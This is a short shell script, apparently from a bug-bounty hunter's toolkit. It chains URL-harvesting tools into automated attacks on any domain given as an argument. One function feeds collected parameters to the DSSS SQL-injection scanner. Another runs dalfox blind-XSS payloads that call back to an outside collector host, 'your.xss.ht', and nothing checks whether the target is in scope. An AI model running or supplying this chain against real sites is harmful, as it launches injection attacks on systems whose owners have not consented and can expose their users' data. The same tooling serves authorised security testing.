###
# ▶ go get -u github.com/lc/gau
# ▶ go get -u github.com/tomnomnom/qsreplace
# ▶ go get -u github.com/tomnomnom/hacks/kxss
# ▶ go get -u github.com/hahwul/dalfox
# ▶ git clone https://github.com/dwisiswant0/DSSS
###

gauq() {
	gau $1 -subs | \
	grep "=" | \
	egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | \
	qsreplace -a
}

sqliz() {
	gauq $1 | python3 $HOME/Tools/DSSS/dsss.py
}

bxss() {
	BLIND="https://your.xss.ht"
	gauq $1 | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | \
	dalfox pipe -b $BLIND
}
